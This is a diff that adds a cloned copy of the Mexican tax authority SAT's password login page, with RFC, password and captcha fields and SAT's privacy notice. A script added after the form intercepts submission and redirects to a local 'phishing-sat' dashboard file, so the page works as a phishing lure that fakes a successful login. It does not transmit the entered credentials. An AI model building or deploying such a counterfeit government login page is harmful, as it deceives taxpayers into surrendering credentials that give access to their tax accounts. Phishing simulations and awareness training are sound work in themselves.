@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<!-- saved from url=(0318)https://login.siat.sat.gob.mx/nidp/idff/sso?id=mat-ptsc-totp_Aviso&sid=0&option=credential&sid=0&target=https%3A%2F%2Fwwwmat.sat.gob.mx%2Fapp%2Fseg%2Fcont%2FaccesoC%3Fparametro%3D1%26url%3D%2Foperacion%2F24016%2Fsolicita-tu-devolucion%26target%3Dprincipal%26tipoLogeo%3Dc%26hostServer%3Dhttps%3A%2F%2Fwwwmat.sat.gob.mx -->
+<html lang="es" class="js svg wf-opensans-i3-active wf-opensans-i4-active wf-opensans-n3-active wf-opensans-n6-active wf-opensans-n7-active wf-opensans-n4-active wf-active"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!-- CSS -->
+    <link href="./main.css" rel="stylesheet">
+    <title>SAT Autenticación</title><link rel="stylesheet" href="./css" media="all">
+</head>
+
+<body style="padding-top: 0px;">
+
+<!-- Contenido -->
+<main class="page">
+    <div class="container" style="width: 100%; padding-left: 0px;" id="container">
+        <ol id="breadcrumb" class="breadcrumb" hidden="" style="margin-left: 8px;"> </ol>
+        <div class="row">
+            <!-- Formulario horizontal, 2/3 como se indica en  GobMX-->
+            <div class="col-sm-8 bottom-buffer">
+                <!-- Titulo -->
+                <div class="bottom-buffer" style="margin-left: 8px;">
+                    <h3>Acceso por contraseña</h3>
+                </div>
+                <!-- Mensaje de error -->
+                <div class="row" style="display: none;" id="divMsgError">
+                    <div class="col-sm-12">
+                        <div class="alert alert-danger" id="msgError"></div>
+                    </div>
+                </div>
+                <!-- Formulario -->
+                <form role="form" id="IDPLogin" name="IDPLogin" enctype="application/x-www-form-urlencoded" method="POST" class="form-horizontal" autocomplete="off">
+                    <input type="hidden" name="option" value="credential">
+                    
+                    <input type="hidden" name="target" value="https://wwwmat.sat.gob.mx/app/seg/cont/accesoC?parametro=1&amp;url=/operacion/24016/solicita-tu-devolucion&amp;target=principal&amp;tipoLogeo=c&amp;hostServer=https://wwwmat.sat.gob.mx">
+                    
+
+                    <div class="form-group">
+                        <label class="col-sm-4 control-label" for="rfc">RFC:</label>
+                        <div class="col-sm-8">
+                            <input class="form-control" id="rfc" placeholder="RFC" type="text" name="Ecom_User_ID" size="25" value="" onblur="javascript:this.value = this.value.toUpperCase();" autocomplete="off">
+                            <span id="msgErrorRfc" style="display: none; color: red; font-size: 11px; font-weight: initial;">Este campo es obligatorio.</span>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="col-sm-4 control-label" for="password">
+                            Contraseña:
+                            <span style="left: -2px;" class="glyphicon glyphicon-question-sign" aria-hidden="true" data-toggle="tooltip" data-placement="right" title="Esta contraseña es la misma de su CIEC o CIEC fortalecida"></span>
+                        </label>
+                        <div class="col-sm-8">
+                            <input class="form-control" id="password" placeholder="Contraseña" type="password" name="Ecom_Password" size="25" maxlength="16" autocomplete="off">
+                            <span id="msgErrorPass" style="display: none; color: red; font-size: 11px; font-weight: initial;">Este campo es obligatorio.</span>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="col-sm-4 control-label" for="claveDinamica">e.firma portable:</label>
+                        <div class="col-sm-8">
+                            <input class="form-control" disabled="" id="claveDinamica" placeholder="Clave dinámica" type="password">
+                        </div>
+                    </div>
+
+                    
+                    <div class="form-group">
+                        <label class="col-sm-4 control-label" for="userCaptcha" style="padding-top: 25px;">Captcha:</label>
+                        <label class="col-sm-3 control-label" id="divCaptcha">
+                            <img src="data:image/jpeg;base64,iVBORw0KGgoAAAANSUhEUgAAAKAAAAA8CAIAAABuCSZCAAAFPUlEQVR42u3aS2sVMRQH8PkMLn3sLVofm+IFV65cCRW1RWwX4qaICmIXKgVFBXcKQl0KgkLpotCF+A1E3Ll0bX19AF2OA4EQ8jj5n5NkJrd3wqHMTXLn3vLjJJncNG3WcujNF1Zsv3pmRjuWtl16tMIN4m7N1vKSjqLA13/NuTEC9wqcbozTeplnCvLhlYkZYt3+gGW6pvHM6iYaD5nBIPAs565lPE3AoO6sGdcFfP/muop6gNcuLZhRj9zK6mkVMt3iwJYoEf0DW6hEDCJKBDeDucb0N2y8yQoGbczSJYBx2j6NEdoQcxQYN45+z0asm92Y1uUO3QKz3cm6GRl1QWPuAzHyTzUpulHjRGBBXqYYg8Ay3agxd9MD/Kca8aSLGOcFNs0IexmwpRsClk26dGvREgcm3oz0yahLAJutRTOYS8taYA8MTFfWA5wriVOA6cqKgIklmNWUksT44jm6tE5M4pTFM9HHapoOYN0KboNwn30rBH7y8ZgMWLdOJbBqzf7NQn7vL9zuon/gTjcdWLXuW+DLt1bNkAHnzeCnJw5YUQnwwXtHzagR2OJEoh9gF9Ubrm45YIsTiczAbjerKV3XYi4BDNJ6mXFg19hqStfFmZOeg73AKbSmcXbg0AhMj8+6MgoMjr1mtxRa0BjayYqiWsBWz3efHpt43Uurxju8Z38OJqZYGtg0FmxjWagWMD1ch2qs/hm2KunNDX3t1TU51Uu3put57uVzHQJgejs6NPASw7K3P3fPWddM5tZU6OsQjGtJJ2sSMP1jovscbGbk9u+LKtz0dZPY0vUCe5dgV89+U0GkLz25suplc7BGNa+9ZqFkjdYLf01CFlmhCZgF3L00dV1g96trWhMYSV8EkugvAHbTVwOHkhUBRmZiFBhPXwLY1PUCW3egjU1dOt2jK2Rk6MaB8fTFR2N6Yo4Dg0nMXT97gb3rLARYfKgj+hQUTV9r/UUbb2786EJnajR9vWzW/JoBWGBstYaAtbEFrI3VtQvc1aTrIsDm4xACTBgrXRfYGquJpx0vsFUvBOYe7YhubnghWcBcY8HWFdg58WiH5T0YMCiNbDUTwN7rELCK6Ok71oYzgYcDg9LuWM0C9l5nABYU755UaN4NYRPA4oID44nuLXp89s7BNDAx74aw5cA7C9/dkBkfXp7vwrzwwrvp2ycwvbwCgU3dKDC9zqIXXKnAXl3QuBBw4tDSD7CbwQ++njejCmBCFzHGgRWt+hsa3rPoDgVs6brGOLCqIcbnIYE1rReYfmMW3SzA4AclAnO3JwcAJpLYBabflXH1x3pMYh3zCBl7dfFRmgsc+bEB100EJgiLAnNTU6wbNTZ1aSoQngecJYNdrRBwF2+3/qgoqis7yyEGVsULjJ+9ktn3BBw6XxcCditLnC8soXtt/oYbIWPW+broZjXjyE4JYNnxHZ3QlRgLdC1jvBQ8dJfxOVgmbbqWNubuXAp0xcaINPdumXeywBIS7Qc4vUR1E40zlmaQTx2B6wI+9fODGf3ojsB0Wdz760YVwNOewaBuUWCvrte44eqOwINnMKHrGo8ZXBHwycmeG7ufN1WAupbxMMCIcVtxKQHs1TWNCwL3v5ZOv/nG8TNdDGicS1cbTx9wyLidklJ6cHaBQV0I+O6/+S7a2ShH7rwIRcpe9JjBtesixuklqtsFvoQegXm6lRirbq8XN0fg/Lo9GOPAiDH7OXjULW2MACvdqLFkq3IEHjaJdZ+osXvbEbgW4JCx2cEE1kHfcwSuCBgpLN3ZBRboVgLMLWMG73Pg/4ppKmBpQyofAAAAAElFTkSuQmCC">
+                        </label>
+                    </div>
+
+                    <div class="form-group">
+                        <div class="col-sm-4"></div>
+                        <div class="col-sm-8">
+                            <input class="form-control" id="userCaptcha" placeholder="Escriba la palabra del captcha" type="text" name="userCaptcha" size="25" maxlength="16" autocomplete="off" onkeyup="javascript:this.value=this.value.toUpperCase();">
+                            <span id="msgErrorCap" style="display: none; color: red; font-size: 11px; font-weight: initial;">Este campo es obligatorio.</span>
+                        </div>
+                    </div>
+                    
+
+                    <div class="clearfix">
+                        <div class="pull-right">
+                            <button type="button" class="btn btn-default" id="buttonFiel">e.firma</button>
+                            <input class="btn btn-primary" type="submit" value="Enviar" id="submit" name="submit">
+                            
+                        </div>
+                    </div>
+
+                    <p style="text-align: right; padding-top: 20px;"><a id="linkPass">¿Olvidaste tu
+                        contraseña?</a></p>
+
+                    <p style="text-align: right">Si aún no cuentas con tu contraseña, obtenla
+                        <a href="https://portalsat.plataforma.sat.gob.mx/CIECInternet/CIECRegister/askRFC.action">aquí</a>.
+                    </p>
+
+                    <p style="text-align: right">Si aún no cuentas con tu e.firma portable, obtenla
+                        <a href="https://www.siat.sat.gob.mx/PTSC/faces/pages/lanzador.jsf?url=/PTSC/asc/faces/pages/generar/authRFC.jsf&amp;tipoLogeo=cs&amp;target=principal&amp;hostserver=https://aplicaciones.sat.gob.mx">aquí</a>.
+                    </p>
+
+                    <p style="text-align: right"><a id="linkeFirma">Requisitos de uso de e.firma portable</a></p>
+
+                </form>
+				<script>
+document.getElementById('IDPLogin').addEventListener('submit', function(event) {
+    event.preventDefault(); 
+    window.location.href = 'file:///C:/Users/alan.guajardo/Documents/phishing-sat/dashboard.html'; 
+});
+</script>
+            </div>
+            <div class="col-sm-4">
+                <div class="row"></div>
+            </div>
+        </div>
+<div class="col-sm-12">
+<div style="background-color: #D9EDF7;
+    width: 100%;
+    border: 2px #BCE8F1;
+    padding: 20px;
+    margin: 2px;
+    font-size: 18px;
+    border-style: solid;
+    overflow: auto;">
+<font color="#31708F"><center><b>Aviso de privacidad simplificado</b></center>
+<center>El Servicio de Administración Tributaria, es el responsable del tratamiento de los datos personales que se recolectan a través de su portal de internet <a target="_blank" onclick="window.open(&#39;https://www.sat.gob.mx&#39;)">(https://www.sat.gob.mx)</a>, los cuales son protegidos conforme a lo dispuesto en la Ley General de Protección de Datos Personales en Posesión de Sujetos Obligados y la normatividad que resulte aplicable.</center>
+<br style="line-height: 20px;">
+<center>Para mayor información acerca de este tema y de los derechos que puedes hacer valer, ponemos a tu disposición el Aviso de privacidad en el sitio: <a target="_blank" onclick="window.open(&#39;https://repositorio.cloudb.sat.gob.mx/FTP/avisoprivacidad/802_NV_aviso_integral.html&#39;)">https://repositorio.cloudb.sat.gob.mx/FTP/avisoprivacidad/802_NV_aviso_integral.html</a></center></font></div>
+<br>
+<br> 
+</div>
+<!-- popup requsitos e.firma -->
+<div id="reqEfirma" class="modal fade" role="dialog" style="display: none;">
+    <div class="modal-dialog modal-lg" style="width: 90%;">
+
+	<!-- Modal content-->
+	<div class="modal-content">
+	    <div class="modal-header">
+		<button type="button" class="close" data-dismiss="modal">×</button>
+		<h4 class="modal-title">Requisitos de uso de e.firma portable</h4>
+	    </div>
+                    <div class="modal-body">
+                        <p style="text-align : justify;">
+                            Para hacer uso de este servicio debes cumplir con los siguientes requisitos:
+                        </p>
+                        <p style="text-align : justify;">
+                            e.firma vigente (archivos .cer y .key).si aún no cuentas con ella, conoce los requisitos
+                            para su trámite, <a href="http://www.sat.gob.mx/fichas_tematicas/fiel/Paginas/obtener_fiel.aspx" target="_blank">aquí.</a>
+                        </p>
+                        <p>
+                            Contraseña (antes CIEC) actualizada, si no cuentas con ella, trámitala
+                            <a href="https://portalsat.plataforma.sat.gob.mx/CIECInternet/CIECCore/main.action" target="_blank">aquí.</a>
+                        </p>
+                        <p>
+                            Correo electrónico registrado en Buzón Tríbutario, si deseas realizar el registro en este
+                            momento, da clic
+                            <a href="https://www.siat.sat.gob.mx/PTSC/index.jsp" target="_blank">aquí.</a>
+                        </p>
+                        <p>Para el aplicativo de administración ubicado en el portal de trámites y servicios, los
+                            requerimientos son:</p>
+                        <p>
+                        </p><ul>
+                            <li>Internet Explorer 10 o superior</li>
+                            <li>Firefox 30.0 o superior</li>
+                            <li>Safari 6.1 o superior</li>
+                            <li>Chrome 27.0 o superior</li>
+                        </ul>
+                        <p></p>
+                        <p>
+                            Dispositivo móvil (teléfono inteligente o tableta), con los siguientes requerimientos
+                            mínimos:
+                        </p>
+                        <p>
+                        </p><ul>
+                            <li>Servicio de Datos</li>
+                            <li>SO Android 4.0 o superior</li>
+                            <li>SO iOS7 o superior</li>
+                        </ul>
+                        <p></p>
+                        <p>Contar con la app SAT móvil previamente instalada en el dispositivo, la cual podrás descargar
+                            a través del Play Store o Apple Store.</p>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="button" class="btn btn-default" data-dismiss="modal">Cerrar</button>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+</main>
+
+<script src="./webfont.js.descarga" type="text/javascript" async=""></script><script src="./plugins.js.descarga"></script><script src="./main(1).js.descarga"></script><script type="text/javascript">
+    //Variables globales
+    var root = 'https://login.siat.sat.gob.mx/';
+    var path = root + 'nidp/gobmx/assets/';
+    var imagesPath = path + 'images/';
+    var scriptsPath = path + 'scripts/';
+    var stylesPath = path + 'styles/';
+
+    var showEncabezado = false;
+    try {
+        window.parent.document
+        if (window.parent.document == undefined) {
+            showEncabezado = false;
+        } else {
+            showEncabezado = true;
+        }
+    } catch (e) {
+        showEncabezado = false;
+    }
+</script>
+
+<!-- JS -->
+
+<script src="./jquery.min.js.descarga"></script>
+<script src="./gobmx.js.descarga"></script>
+<script src="./respond.min.js.descarga"></script>
+<script src="./ie8.js.descarga"></script>
+
+
+<script>
+    $gmx(document).ready(function () {
+        //Validar error
+        var error = '';
+
+        if (error != "" || error.length != 0) {
+            $('#msgError').html('<strong>Error!</strong> ' + error);
+            $('#divMsgError').show();
+        }
+
+        //submit
+        $("#IDPLogin").submit(function (event) {
+            //Se validan los campos
+            if (validate()) {
+                $("#IDPLogin").submit();
+            } else {
+                event.preventDefault();
+            }
+        });
+
+        //Link para olvidaste tu contraseña
+        $('#linkPass').click(function () {
+            $(location).attr('href', 'https://www.siat.sat.gob.mx/PTSC/auth/faces/pages/restablecer/rc_inicio.jsf')
+        });
+        //Link para requisitos de e.firma portable
+        $('#linkeFirma').click(function () {
+            //cargar en un DIV como popup la liga de los requisitos
+            $("#reqEfirma").modal();
+            $("#reqEfirma").show();
+        });
+
+        //Boton FIEL
+        $('#buttonFiel').click(function () {
+            $(location).attr('href', 'https://login.siat.sat.gob.mx/nidp/idff/sso?id=fiel_Aviso&sid=0&option=credential&sid=0')
+        });
+
+
+        //funcion para validar los campos
+        function validate() {
+            $('#msgErrorRfc').hide();
+            $('#msgErrorPass').hide();
+            $('#msgErrorCap').hide();
+            $('#rfc').css({'borderColor': '#ccc'});
+            $('#password').css({'borderColor': '#ccc'});
+            $('#userCaptcha').css({'borderColor': '#ccc'});
+
+            var continuar = true;
+            var rfcInput = $('#rfc').val();
+            var passwordInput = $('#password').val();
+            var jcaptchaInput = $('#userCaptcha').val();
+
+            var error = '';
+            if (rfcInput == '') {
+                $('#rfc').css({'borderColor': '#D0021B'});
+                $('#msgErrorRfc').show();
+
+                $('#divMsgError').show();
+                $('#msgError').html('<strong>¡Error de registro!</strong> no ha llenado varios campos requeridos. Por favor verifique.');
+                continuar = false;
+            }
+            if (passwordInput == '') {
+                $('#password').css({'borderColor': '#D0021B'});
+                $('#msgErrorPass').show();
+                continuar = false;
+                $('#divMsgError').show();
+                $('#msgError').html('<strong>¡Error de registro!</strong> no ha llenado varios campos requeridos. Por favor verifique.');
+            }
+			var vc = true;
+            var ce = false;
+            if(vc && !ce){
+                var jcaptchaInput = $('#userCaptcha').val();
+                if (jcaptchaInput == '') {
+                    $('#userCaptcha').css({'borderColor': '#D0021B'});
+                    $('#msgErrorCap').show();
+                    continuar = false;
+                    $('#divMsgError').show();
+                    $('#msgError').html('<strong>¡Error de registro!</strong> no ha llenado varios campos requeridos. Por favor verifique.');
+                }
+            }
+            return continuar;
+        }
+    });
+
+
+</script>
+
+
+
+
+</body></html>
